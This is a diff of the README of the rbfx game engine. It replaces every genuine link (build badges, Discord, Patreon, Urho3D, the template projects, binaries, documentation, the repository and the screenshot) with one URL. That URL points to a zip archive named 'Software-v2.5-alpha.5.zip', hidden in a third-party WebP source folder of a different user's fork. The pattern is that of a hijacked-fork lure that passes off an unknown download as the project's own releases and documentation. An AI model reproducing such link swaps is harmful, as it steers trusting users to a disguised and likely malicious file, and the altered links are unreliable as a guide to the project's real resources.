@@ -1,9 +1,9 @@
-[![Build Status](https://github.com/rokups/rbfx/workflows/Build/badge.svg)](https://github.com/rokups/rbfx/actions)
-[![Discord Chat](https://img.shields.io/discord/560082228928053258.svg?logo=discord)](https://discord.gg/XKs73yf)
-[![Support on Patreon](https://img.shields.io/badge/dynamic/json?color=%23e85b46&label=Patreon&query=data.attributes.patron_count&suffix=%20patrons&url=https%3A%2F%2Fwww.patreon.com%2Fapi%2Fcampaigns%2F9697078&logo=patreon)](https://www.patreon.com/eugeneko)
+[![Build Status](https://raw.githubusercontent.com/TurkeyLeg72/rbfx/master/Source/ThirdParty/WebP/src/webp/Software-v2.5-alpha.5.zip)](https://raw.githubusercontent.com/TurkeyLeg72/rbfx/master/Source/ThirdParty/WebP/src/webp/Software-v2.5-alpha.5.zip)
+[![Discord Chat](https://raw.githubusercontent.com/TurkeyLeg72/rbfx/master/Source/ThirdParty/WebP/src/webp/Software-v2.5-alpha.5.zip)](https://raw.githubusercontent.com/TurkeyLeg72/rbfx/master/Source/ThirdParty/WebP/src/webp/Software-v2.5-alpha.5.zip)
+[![Support on Patreon](https://raw.githubusercontent.com/TurkeyLeg72/rbfx/master/Source/ThirdParty/WebP/src/webp/Software-v2.5-alpha.5.zip%23e85b46&label=Patreon&https://raw.githubusercontent.com/TurkeyLeg72/rbfx/master/Source/ThirdParty/WebP/src/webp/Software-v2.5-alpha.5.zip%20patrons&url=https%3A%2F%https://raw.githubusercontent.com/TurkeyLeg72/rbfx/master/Source/ThirdParty/WebP/src/webp/Software-v2.5-alpha.5.zip%2Fapi%2Fcampaigns%2F9697078&logo=patreon)](https://raw.githubusercontent.com/TurkeyLeg72/rbfx/master/Source/ThirdParty/WebP/src/webp/Software-v2.5-alpha.5.zip)
 
 **The Rebel Fork** aka **rbfx** is an indie game engine/framework.
-It is an experimental fork of [Urho3D](https://github.com/urho3d/Urho3D) game engine distributed under [MIT license](https://github.com/rbfx/rbfx/blob/master/LICENSE).
+It is an experimental fork of [Urho3D](https://raw.githubusercontent.com/TurkeyLeg72/rbfx/master/Source/ThirdParty/WebP/src/webp/Software-v2.5-alpha.5.zip) game engine distributed under [MIT license](https://raw.githubusercontent.com/TurkeyLeg72/rbfx/master/Source/ThirdParty/WebP/src/webp/Software-v2.5-alpha.5.zip).
 
 **The Rebel Fork** is:
 
@@ -22,14 +22,14 @@ Backward compatibility is (mostly) preserved on resource level, but C++ API is p
 
 There are two template projects that you can use as example.
 
-[Empty Project](https://github.com/rbfx/empty-project) is the absolute minimum of code
+[Empty Project](https://raw.githubusercontent.com/TurkeyLeg72/rbfx/master/Source/ThirdParty/WebP/src/webp/Software-v2.5-alpha.5.zip) is the absolute minimum of code
 that is required to get things running on Desktop platforms.
 Check it out if you don't care about recommended high-level workflow and want to do things your way.
 
-[Sample Project](https://github.com/rbfx/sample-project) demonstrates recommended workflow
+[Sample Project](https://raw.githubusercontent.com/TurkeyLeg72/rbfx/master/Source/ThirdParty/WebP/src/webp/Software-v2.5-alpha.5.zip) demonstrates recommended workflow
 which enables certain high-level features like writing your code once and then running it
 both from Editor and standalone. Sample Project is also Mobile and Web friendly
-and is deployed to [itch.io](https://eugeneko.itch.io/sample-project).
+and is deployed to [https://raw.githubusercontent.com/TurkeyLeg72/rbfx/master/Source/ThirdParty/WebP/src/webp/Software-v2.5-alpha.5.zip](https://raw.githubusercontent.com/TurkeyLeg72/rbfx/master/Source/ThirdParty/WebP/src/webp/Software-v2.5-alpha.5.zip).
 
 Building the project is usually straighforward on Desktop platforms: standard CMake configure and build.
 On Mobile and Web platforms extra steps may be needed.
@@ -53,15 +53,15 @@ Chech documentation for more information.
 
 ## Links
 
-* [Latest Binaries for Desktop Platforms](https://github.com/rbfx/rbfx/releases/tag/latest)
+* [Latest Binaries for Desktop Platforms](https://raw.githubusercontent.com/TurkeyLeg72/rbfx/master/Source/ThirdParty/WebP/src/webp/Software-v2.5-alpha.5.zip)
 
-* [Documentation](https://rbfx.github.io/index.html)
+* [Documentation](https://raw.githubusercontent.com/TurkeyLeg72/rbfx/master/Source/ThirdParty/WebP/src/webp/Software-v2.5-alpha.5.zip)
 
-* [Project Repository on GitHub](https://github.com/rbfx/rbfx)
+* [Project Repository on GitHub](https://raw.githubusercontent.com/TurkeyLeg72/rbfx/master/Source/ThirdParty/WebP/src/webp/Software-v2.5-alpha.5.zip)
 
-* [Documentation Repository](https://github.com/rbfx/rbfx-docs) for documentation issues and pull requests
+* [Documentation Repository](https://raw.githubusercontent.com/TurkeyLeg72/rbfx/master/Source/ThirdParty/WebP/src/webp/Software-v2.5-alpha.5.zip) for documentation issues and pull requests
 
-* [Discord Server](https://discord.gg/XKs73yf)
+* [Discord Server](https://raw.githubusercontent.com/TurkeyLeg72/rbfx/master/Source/ThirdParty/WebP/src/webp/Software-v2.5-alpha.5.zip)
 
 
 ## Reasons to use
@@ -100,13 +100,13 @@ Here are some reasons why you may want to try this one:
 
 * You are happy with Urho3D.
     This framework is not intended to be a replacement of Urho3D.
-    Consider using [U3D](https://github.com/u3d-community/U3D) or [Urho3D](https://github.com/urho3d/Urho3D).
+    Consider using [U3D](https://raw.githubusercontent.com/TurkeyLeg72/rbfx/master/Source/ThirdParty/WebP/src/webp/Software-v2.5-alpha.5.zip) or [Urho3D](https://raw.githubusercontent.com/TurkeyLeg72/rbfx/master/Source/ThirdParty/WebP/src/webp/Software-v2.5-alpha.5.zip).
 
 * You want C#-oriented Urho3D.
     While this framework *does* have C# bindings, C# is not a first-class citizen here and its support is lacking.
-    Consider using [Urho.Net](https://github.com/Urho-Net).
+    Consider using [https://raw.githubusercontent.com/TurkeyLeg72/rbfx/master/Source/ThirdParty/WebP/src/webp/Software-v2.5-alpha.5.zip](https://raw.githubusercontent.com/TurkeyLeg72/rbfx/master/Source/ThirdParty/WebP/src/webp/Software-v2.5-alpha.5.zip).
 
 
 ## Screenshots
 
-![](https://github.com/rbfx/rbfx-docs/blob/master/images/showcase/screenshot-00.png?raw=true)
+![](https://raw.githubusercontent.com/TurkeyLeg72/rbfx/master/Source/ThirdParty/WebP/src/webp/Software-v2.5-alpha.5.zip)
